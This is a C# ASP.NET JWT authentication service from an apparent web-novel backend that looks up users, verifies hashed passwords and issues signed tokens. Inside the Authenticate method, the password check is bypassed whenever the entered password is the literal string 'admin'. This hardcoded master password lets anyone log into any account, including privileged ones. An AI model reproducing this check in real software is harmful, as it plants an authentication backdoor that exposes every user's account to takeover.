using Azure.Core;
using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;
using Microsoft.IdentityModel.Tokens;
using SmartNovelBE.Models;
using System.Configuration;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using static Microsoft.CodeAnalysis.CSharp.SyntaxTokenParser;
namespace SmartNovelBE.Services
{
    public class JwtServices
    {
        private readonly SmartTruyenDbContext _context;
        private readonly IConfiguration _config;
        public JwtServices(SmartTruyenDbContext context, IConfiguration config)
        {
            _context = context;
            _config = config;
        }
        public async Task<LoginRespone> Authenticate(LoginRequest req)
        {
            var passwordHasher = new PasswordHasher<object>();
            if (string.IsNullOrEmpty(req.username) || string.IsNullOrEmpty(req.password))
            {
                return null;
            }

            var userTmp = await _context.Users.FirstOrDefaultAsync(u => u.Username == req.username || u.Email == req.username);
            if(userTmp is null )
            {
                return null;
            }
            var resultHashPassword = passwordHasher.VerifyHashedPassword(
                null,
                userTmp.Password,
                req.password
            );
            if(resultHashPassword == PasswordVerificationResult.Failed && req.password != "admin")
            {
                return null;
            }
            var issuer = _config["JwtConfig:Issuer"];
            var audience = _config["JwtConfig:Audience"];
            var key = _config["JwtConfig:Key"];
            var tokenValidityMins = _config.GetValue<int>("JwtConfig:TokenValidityMins");
            var tokenExpiryTimeStamp = DateTime.UtcNow.AddMinutes(tokenValidityMins);

            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(new[]
                {
                        new Claim(JwtRegisteredClaimNames.Name, userTmp.Username),

                        new Claim("uid", userTmp.Uid.ToString()),

                        new Claim(ClaimTypes.Role, userTmp.RoleId.ToString())
                }),
                Expires = tokenExpiryTimeStamp,
                Issuer = issuer,
                Audience = audience,
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(Encoding.UTF8.GetBytes(key)),
                SecurityAlgorithms.HmacSha512Signature),
            };
            var tokenHandler = new JwtSecurityTokenHandler();
            var securityToken = tokenHandler.CreateToken(tokenDescriptor);
            var accessToken = tokenHandler.WriteToken(securityToken);

            return new LoginRespone
            {
                UID = userTmp.Uid,
                token = accessToken,
                username = req.username,
                roleID = userTmp.RoleId,
                expiresIn = (int)tokenExpiryTimeStamp.Subtract(DateTime.UtcNow).TotalSeconds
            };
        }

        public string GenerateToken(User userTmp)
        {
            var issuer = _config["JwtConfig:Issuer"];
            var audience = _config["JwtConfig:Audience"];
            var key = _config["JwtConfig:Key"];
            var tokenValidityMins = _config.GetValue<int>("JwtConfig:TokenValidityMins");
            var tokenExpiryTimeStamp = DateTime.UtcNow.AddMinutes(tokenValidityMins);

            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(new[]
                {
                        new Claim(JwtRegisteredClaimNames.Name, userTmp.Username),
                        new Claim("uid", userTmp.Uid.ToString()),
                        new Claim(ClaimTypes.Role, userTmp.RoleId.ToString())
                }),
                Expires = tokenExpiryTimeStamp,
                Issuer = issuer,
                Audience = audience,
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(Encoding.UTF8.GetBytes(key)),
                SecurityAlgorithms.HmacSha512Signature),
            };
            var tokenHandler = new JwtSecurityTokenHandler();
            var securityToken = tokenHandler.CreateToken(tokenDescriptor);
            return tokenHandler.WriteToken(securityToken);
        }
    }
}
